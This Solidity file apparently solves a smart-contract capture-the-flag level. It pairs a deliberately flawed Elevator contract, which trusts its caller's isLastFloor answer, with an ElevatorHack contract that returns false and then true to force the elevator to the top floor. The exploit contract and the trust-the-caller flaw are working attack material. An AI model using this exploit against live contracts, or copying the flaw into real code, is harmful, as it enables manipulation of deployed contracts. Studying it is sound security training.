// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}


contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorHack {
    Elevator private elevator;
    bool private cur = true;

    constructor(Elevator _elevator) public {
        elevator = _elevator;
    }

    // should return false then true
    function isLastFloor(uint) external returns (bool) {
        cur = !cur;
        return cur;
    }

    function attack() external {
        elevator.goTo(uint(-1));
    }
}